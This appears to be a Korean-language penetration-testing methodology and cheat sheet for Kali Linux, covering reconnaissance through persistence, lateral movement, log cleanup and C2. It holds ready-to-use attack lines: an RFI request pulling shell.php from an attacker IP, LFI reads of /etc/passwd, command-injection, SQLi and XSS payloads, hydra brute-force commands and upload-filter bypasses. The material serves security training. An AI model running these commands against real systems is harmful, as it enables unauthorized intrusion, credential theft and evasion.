<div align="center">
    <img src="https://www.kali.org/images/kali-dragon-icon.svg" alt="Kali Linux 로고" width="150" />
</div>

### Kali Linux 보안 & 침투 테스트 활동을 위해 격리된 환경을 제공합니다.

강력한 침투 프레임워크를 활용하여 침투, 피봇, 자동화, 중앙처리, 강력한 우회, 파일리스 인 메모리 트랜드를 따릅니다.

# 침투 방법론

## 1. 정보 수집

    - happy path
    - 포트스캔
      - nmap 스캔: nmap -sC -sV -p- -oA scan_results <타겟IP>
      - masscan: masscan -p1-65535 <타겟IP> --rate=1000
      - wireshark를 통한 패킷 캡처 및 분석
    - nc 직접 연결 스캔: nc -nvz <타겟IP> 1-1000
    - 서비스 스캔
      - 웹서비스: whatweb <타겟URL>, nikto -host <타겟IP>
      - DNS: dig, host, nslookup
      - SNMP: snmpwalk, snmp-check
      - 배너 그래빙: nc <타겟IP> <포트>
    - 패시브 정보 수집
      - OSINT: Shodan, Censys, Google Dorks
      - WHOIS, DNS 조회
    - 웹 애플리케이션 매핑
      - 디렉토리 브루트포싱: gobuster, dirbuster, ffuf
      - 기술 스택 식별: Wappalyzer, builtwith
    - exploit framework
      - searchsploit를 이용한 로컬 취약점 검색

## 2. 취약점 분석

    - DDOS | DOS 는 스트레스 테스트에 주로 사용하며 실제 모의해킹에서는 자주 사용하지 않음
    - Authenticated, Unauthenticated 인증 또는 미인증 payload 공격이 가능한지 판단하기
    - SSH 공개키 확보
      - 약한 SSH 키 설정 확인
      - 키 관리 문제 검사 (authorized_keys, known_hosts)
    - 힙메모리, 어셈블리 침투 등 복잡한 방법도 많지만 고급보다는 쉬운 방법의 조합으로도 얼마든지 대문열고 들어갈 수 있음
    - 서비스, OS, 하드웨어 등 다양한 방식으로 수집한 취약점들을 조합하여 공격 계획 세우기
    - 수동 (정확도, 디테일, 비용) / 자동 (거짓 양성, 거짓 음성) 취약점 진단
    	1. 오픈된 포트가 있는가
    	2. 어떤 서비스를 사용중인가
    	3. 연결이 되는가
    	4. 소통이 되는가
    	5. 어떤 정보를 수집할 수 있는가
    	6. 수집한 정보를 조합하여 취약점을 찾아내고 해당 취약점을 악용할 수 있는 방법은 무엇인가
    - 발견된 모든 정보는 문서화
    - source 분석 웹이라면 OWASP REST API
    - sink 입력된 값에 대해 시스템과 서비스 내에서 어떻게 사용되는가
    - happy path testing

    - 웹 애플리케이션 취약점 분석
      - burpsuite (postman + webproxy)
        - 요청 및 응답 분석
        - 세션 관리 취약점 테스트
        - 인증 우회 테스트
      - robots.txt 블랙 리스트 처리된 경로 확인
      - LFI, RFI 서버 내 파일 실행
        - LFI: curl "http://<타겟IP>/page.php?file=../../../etc/passwd"
        - RFI: curl "http://<타겟IP>/page.php?file=http://<공격자IP>/shell.php"
      - dir brute force : gobuster, fuff, wfuzz
        - gobuster dir -u http://<타겟IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
        - ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<타겟IP>/FUZZ
      - file upload :
    	    1. 확장자 변경: .php -> .php5, .phtml, .php.jpg
    	    2. 웹 서버에 맞는 파일 php, node, java, rust 등
    	    3. 매직 바이트 변경 xxd
    	    4. Content Type (MIME Type) 변조: image/jpeg -> application/x-php
      - command injection
        - 기본 주입: ; ls -la
        - 출력 리다이렉션: $(cat /etc/passwd)
        - 역슬래시 우회: c\at /etc/passwd
      - CVE
          1. 분석 및 검토: searchsploit, exploitdb, NVD 확인
          2. 페이로드 준비: 환경에 맞게 수정

    - 네트워크 서비스 취약점
      - Recursive Directory brute force
      - SMB 445
          1. netexec smb <타겟IP> -u <유저명> -p <패스워드>
          2. smbmap -H <타겟IP> -u <유저명> -p <패스워드>
          3. smbclient //<타겟IP>/share -U <유저명>
          4. rpcclient -U "" <타겟IP> (익명 연결 시도)
          5. 취약한 버전 확인: Eternal Blue (MS17-010)
      - NFS 111, 2049
          1. showmount -e <타겟IP>
          2. no_root_squash 활성화 취약점 확인
              - nfsclient 로 직접 확인이 불가하므로 로컬 디렉토리에 직접 마운트하여 확인하기
              - mount -t nfs <타겟IP>:/shared /mnt/nfs
              - /etc/exports 파일에서 no_root_squash 설정 확인
      - FTP 21
          1. anonymous 로그인 시도: ftp <타겟IP> (user: anonymous)
          2. 브루트포스: hydra -l <유저명> -P <패스워드리스트> ftp://<타겟IP>
          3. 설정 파일 확인: vsftpd.conf, proftpd.conf
      - SSH 22
          1. 배너 그래빙: 버전 정보 수집
          2. 브루트포스: hydra -l <유저명> -P <패스워드리스트> ssh://<타겟IP>
          3. 약한 키 설정: ssh-audit <타겟IP>
      - SMTP 25, 587
          1. 이메일 계정 열거: smtp-user-enum
          2. VRFY, EXPN, RCPT 명령으로 사용자 검증
      - HTTP/HTTPS 80, 443
          1. 서버 정보 노출: 헤더 분석
          2. 웹 취약점 스캐닝: nikto, OWASP ZAP
          3. SSL 설정 분석: sslscan, testssl.sh
      - RDP 3389
          1. 인증 브루트포스: crowbar, hydra
          2. BlueKeep (CVE-2019-0708) 취약점 확인

## 3. 초기 침투 (최초 액세스 확보)

    - 패스워드 공격
      - 브루트포스: Hydra, Medusa, Patator
        - hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<타겟IP>
        - hydra -L users.txt -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:F=Login failed"
      - 패스워드 스프레이: 다수의 계정에 소수의 흔한 비밀번호 시도
      - 기본 자격증명(Default Credentials) 시도

    - 웹 애플리케이션 공격
      - SQL 인젝션
        - 기본 인젝션: ' OR 1=1 --
        - 인증 우회: admin' --
        - 블라인드 SQLi: ' AND (SELECT 1 FROM users WHERE username='admin' AND length(password)>8)=1 --
        - 데이터베이스 열거: UNION SELECT 활용
        - sqlmap 자동화: sqlmap -u "http://<타겟IP>/page.php?id=1" --dbs
      - XSS (Cross-Site Scripting)
        - 반사형(Reflected): <script>alert('XSS')</script>
        - 저장형(Stored): 데이터베이스에 저장되는 XSS 페이로드
        - DOM 기반: 클라이언트 측 스크립트 조작
      - CSRF (Cross-Site Request Forgery)
        - 토큰 검증 우회
        - 요청 위조 테스트
      - File Inclusion
        - LFI to RCE 기법: log poisoning, /proc/self/environ
        - PHP wrappers 활용: php://filter/convert.base64-encode/resource=index.php

    - 네트워크 서비스 공격
      - 원격 코드 실행(RCE)
        - Metasploit 프레임워크 활용
        - 공개 익스플로잇 수정 및 활용
      - 서비스별 취약점
        - WebLogic, Tomcat, JBoss 등 서버 취약점
        - Jenkins, Jira, GitLab 등 도구 취약점
      - 자격 증명 탈취
        - Responder를 통한 NTLM 해시 캡처
        - Mimikatz를 통한 메모리 내 자격 증명 추출
      - 이메일 피싱 (OSCP 시험에서는 제한적으로 사용)
        - 스피어 피싱
        - 매크로 활성화 문서

## 4. 권한 상승

    - Windows 권한 상승
      - 보안 패치 누락 확인
        - systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
        - Watson, Windows Exploit Suggester
      - 알려진 취약점 활용
        - Kernel 취약점: MS16-032, MS15-051
        - 서비스 취약점: Unquoted Service Path, 취약한 서비스 실행 파일
      - 잘못된 권한 설정
        - icacls 명령어로 권한 확인
        - AccessChk 도구 활용
      - AlwaysInstallElevated 설정 확인
      - DLL 하이재킹
      - UAC 바이패스
      - 자격 증명 수집
        - 윈도우 자격 증명 관리자
        - SAM 파일
        - LSASS 메모리 덤프

    - Linux 권한 상승
      - 커널 취약점 (Dirty COW 등)
        - uname -a로 커널 버전 확인
        - searchsploit로 해당 버전 취약점 검색
      - SUID/SGID 바이너리 검색
        - find / -perm -4000 -type f 2>/dev/null
        - 취약한 SUID 바이너리 악용
      - sudo 권한 오용
        - sudo -l로 현재 사용자의 sudo 권한 확인
        - GTFOBins 참조하여 권한 상승 방법 확인
      - 환경 변수 활용
        - PATH 변수 조작
        - LD_PRELOAD 악용
      - cron 작업 조작
        - 쓰기 가능한 cron 스크립트 검색
        - 와일드카드 명령어 악용
      - 서비스 설정 파일 변경
      - 취약한 라이브러리 로드
      - 캐퍼빌리티 오용
        - getcap -r / 2>/dev/null

    - 자동화 도구
      - Linux: LinPEAS, LinEnum, linux-smart-enumeration
      - Windows: WinPEAS, PowerUp, JAWS, Sherlock
      - 모두: pspy (프로세스 모니터링)

## 5. 권한 유지

    - 지속성 확보 메커니즘
      - 백도어 생성
        - 웹쉘: PHP, ASP, JSP 웹쉘 설치
        - 리버스 쉘: 지속적 연결을 위한 스크립트 설정
      - 사용자 계정 생성
        - 관리자 계정 추가
        - 기존 계정 권한 상승

    - Windows 지속성
      - 시작 폴더에 파일 추가
      - 레지스트리 수정
        - Run/RunOnce 키 활용
        - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
      - 서비스 생성
        - sc create 명령어 활용
      - 예약 작업
        - schtasks /create 명령어 활용
      - WMI 이벤트 구독
      - DLL 사이드로딩

    - Linux 지속성
      - cron 작업 등록
        - crontab -e
        - /etc/crontab 수정
      - 시작 스크립트 수정
        - rc.local, init.d 스크립트 등
      - SSH 키 설치
        - ~/.ssh/authorized_keys 파일 수정
      - PAM 모듈 수정
      - 서비스 생성
        - systemd 서비스 파일 생성

    - 메모리 상주 기법 (파일리스 악성코드)
      - Windows: PowerShell Empire, Mimikatz
      - Linux: 메모리 내 실행 기법

## 6. 측면 이동 (Lateral Movement)

    - 네트워크 정찰
      - 내부 네트워크 스캔
        - ping sweep: for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from"; done
        - nmap 내부 스캔: nmap -sn 10.10.10.0/24
      - 네트워크 트래픽 분석
      - 활성 세션 검사

    - 자격 증명 수집 및 재사용
      - 해시 덤핑: Mimikatz, hashdump
      - 패스워드 스프레이
      - Pass-the-Hash 공격
      - Pass-the-Ticket 공격
      - 자격 증명 파일 검색 (config 파일, 백업 등)

    - 원격 액세스
      - 원격 데스크톱 프로토콜(RDP)
      - SSH 터널링
      - WinRM, WMI
      - SMB를 통한 접근 (psexec)

    - 도메인 환경 공격 (AD)
      - Kerberoasting
      - Golden/Silver Ticket
      - DCSync

## 7. 증거 수집

    - 민감한 정보 추출
      - 비밀번호 파일: /etc/shadow, SAM
      - 설정 파일
      - 데이터베이스 접근
      - API 키, 토큰

    - 사용자 데이터 검색
      - 이메일, 문서, 스프레드시트
      - 히스토리 파일 (.bash_history, PowerShell 로그)

    - 시스템 정보 수집
      - OS 버전 및 패치 정보
      - 실행 중인 서비스 목록
      - 네트워크 구성
      - 사용자 계정 목록

    - 로그 분석
      - 로그인 기록
      - 실패한 접속 시도
      - 서비스 로그

## 8. 정리 (Covering Tracks)

    - 로그 청소
      - Windows: 이벤트 로그 삭제/조작
      - Linux: /var/log 파일 삭제/수정
      - 웹 서버 로그 정리

    - 임시 파일 제거
      - 페이로드, 스크립트 등 공격 도구 제거
      - /tmp, %TEMP% 디렉토리 청소

    - 계정 및 권한 정리
      - 생성한 계정 제거
      - 수정한 권한 복원

    - 지속성 메커니즘 제거
      - 백도어 제거
      - 추가한 cron/예약 작업 제거
      - 변경한 시작 스크립트 복원

# 공격 벡터별 테크닉

## 웹 애플리케이션 공격

    - SQL 인젝션
      - Error-based: 에러 메시지를 통한 정보 수집
      - Union-based: UNION SELECT를 통한 데이터 추출
      - Blind: Boolean 또는 Time-based 방식으로 정보 추출
      - Out-of-band: 외부 채널을 통한 데이터 유출

    - 인증 우회
      - 약한 자격 증명
      - 브루트포스
      - 세션 관리 취약점
      - OAuth 구현 오류

    - 업로드 취약점
      - 확장자 필터링 우회
      - MIME 타입 조작
      - 이중 확장자: shell.php.jpg
      - null byte 삽입: shell.php%00.jpg

## 네트워크 서비스 공격

    - SMB 서비스 공격
      - EternalBlue (MS17-010)
      - SambaCry (CVE-2017-7494)
      - 약한 SMB 공유 권한

    - RDP 공격
      - BlueKeep (CVE-2019-0708)
      - 약한 인증
      - NLA 비활성화 악용

    - SSH 공격
      - 약한 암호화 설정
      - 키 기반 인증 약점
      - 구형 프로토콜 버전

## 방화벽/WAF 우회 기법

    - IP 프래그먼테이션
    - 인코딩 변형
      - URL 인코딩, 이중 인코딩
      - Base64, HEX 인코딩
    - 프로토콜 변형
    - 타이밍 공격

## 침투 도구

    - 정보 수집
      - nmap, masscan, dmitry, recon-ng
      - TheHarvester, Shodan, OSINT Framework

    - 취약점 스캔
      - Nessus, OpenVAS, Nikto
      - WPScan, SQLmap, OWASP ZAP

    - 익스플로잇
      - Metasploit Framework
      - SearchSploit
      - BeEF (Browser Exploitation Framework)

    - 권한 상승
      - LinPEAS/WinPEAS
      - Linux-Exploit-Suggester, Windows-Exploit-Suggester
      - PowerUp, PowerSploit

    - 포스트 익스플로잇
      - Empire, PoshC2
      - Mimikatz, LaZagne
      - CrackMapExec

# C2 (Command & Control)

    - 오픈소스 C2 프레임워크
      - Cobalt Strike (상용)
      - Sliver - 고급 크로스 플랫폼 C2
      - Havoc - 최신 C2 프레임워크
      - Mythic - 다중 에이전트 C2

    - 기능
      - 세션 관리
      - 페이로드 생성
      - 통신 프로파일
      - 플러그인 및 확장성
      - 데이터 수집 및 유출
      - 기타 포스트 익스플로잇 기능

    - 통신 채널 구성
      - DNS 터널링
      - HTTPS 보안 통신
      - 도메인 프론팅
      - 커스텀 프로토콜

# 문서화 및 보고

    - 증거 수집 및 보존
      - 스크린샷
      - 명령어 출력 기록
      - 로그 파일

    - 보고서 작성
      - 취약점 상세 설명
      - 공격 방법 재현 단계
      - 위험도 평가
      - 해결 방안 제시

    - 의사소통
      - 기술적/비기술적 의사소통
      - 명확한 취약점 영향 설명
      - 우선순위 제안

# 실전 침투 테스트 팁

    - 메모 습관 기르기
      - KeepNote, CherryTree, Obsidian
      - 모든 명령어와 결과 기록
      - 스크린샷 체계적 보관

    - 네트워크 연결 관리
      - 안정적인 VPN 연결 유지
      - 세션 유지 기법 활용
      - 여러 경로의 접근 유지

    - 시간 관리
      - Rabbit hole 피하기
      - 지나치게 복잡한 공격 지양
      - 주기적 휴식과 관점 전환

    - 침착함 유지
      - 체계적 접근 방식 유지
      - 기본기에 충실한 공격
      - 상황 정리 및 재시작
